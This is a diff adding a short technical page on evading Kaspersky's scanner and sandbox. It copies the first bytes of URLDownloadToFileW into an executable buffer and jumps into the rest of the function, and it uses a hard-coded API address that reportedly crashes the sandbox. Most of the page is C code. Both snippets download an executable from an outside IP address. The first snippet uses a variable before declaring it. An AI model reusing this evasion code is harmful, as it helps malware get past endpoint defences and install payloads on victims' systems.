@@ -1,0 +1,53 @@
+
+                        API Memcpy
+Kaspersky's sandbox environment has been known to have gaps in what it emulates when examining a process.  One such example was found while testing a technique found in known-malware.  The technique involved copying the first few assembly instructions of target Windows APIApplication Programming Interface functions to an executable buffer, then calling a jmp command after executing the copied instructions which 
+would jmp to the rest of the APIApplication Programming Interface code.  For example:
+DWORD dwOldProtect;
+BYTE *urlcode = (BYTE*)VirtualAlloc(NULL, 16, MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE);
+HMODULE urlmon = LoadLibrary(L"Urlmon.dll");
+BYTE* func = (BYTE*)GetProcAddress(urlmon, "URLDownloadToFileW");
+memcpy(urlcode, func, 6);  //copy off the first 6 bytes (first few instructions) from the function to our buffer
+lpUrlAddr += 6;
+
+//make jump to lpUrlAddr+6, copy to urlcode.  call urlcode
+BYTE jump[8] = {0};
+jump[0] = 0x68; //push address to jump to
+memcpy((jump+1), &lpUrlAddr, 4);
+jump[5] = 0x58; //pop address into EAX
+jump[6] = 0xff; //jmp eax
+jump[7] = 0xe0;
+ 
+memcpy((urlcode+6), jump, 8); //copy the jump sequence to our execution buffer
+ 
+VirtualProtect(urlcode, 16, PAGE_EXECUTE_READ, &dwOldProtect); //Mark buffer as READ and EXECUTE
+HRESULT h = (*(HRESULT(*)(LPVOID, PWCHAR, PWCHAR, DWORD, LPVOID))urlcode)(NULL, L"http://192.168.40.139/MessageBox.exe", L"MessageBox.exe", 0, NULL); //Call our buffer with the parameters normally sent to URLDownloadToFileW
+ 
+While testing this technique's effectiveness, it was found that this technique was effective against Kaspersky's scanner when the executable was placed on the target system (compared to this same executable directly calling URLDownloadToFileW).
+ 
+A side effect of this testing revealed that Kaspersky's sandbox will return a different value for GetProcAddress.  See the example below:
+DWORD dwOldProtect;
+BYTE *urlcode = (BYTE*)VirtualAlloc(NULL, 16, MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE);
+HMODULE urlmon = LoadLibrary(L"Urlmon.dll");
+BYTE* func = (BYTE*)GetProcAddress(urlmon, "URLDownloadToFileW");
+BYTE* lpUrlAddr = (BYTE*)0x78169c9c; //Hard coded address of URLDownloadToFileW
+
+memcpy(urlcode, lpUrlAddr , 6);  //Apparently this line causes Kasp sandbox to crash
+//memcpy(urlcode, func, 6); -- This line would not trick Kasp into not flagging us
+
+//Normally causes Kaspersky to flag and delete executable when it is dropped to disk.  In this case, Kaspersky does not do that
+HRESULT h = URLDownloadToFile(NULL, L"http://192.168.40.139/MessageBox.exe", L"MessageBox.exe", 0, NULL); 
+In the above code block, the result of GetProcAddress should be equal to the value of lpUrlAddr (confirmed to be true when run with debug output without PSPs around).  However, when memcpy's source parameter is the hard coded address (and not func, the value returned from GetProcAddress), Kaspersky fails to flag the file as malicious.  If memcpy's source parameter was func, Kaspersky would flag the file as malicious.
+ 
+Source
+
+Previous versions:
+| 1 
+| 2 
+| 3 
+| 4 
+| 5 
+| 6 
+| 7 
+| 8 
+|
+                    
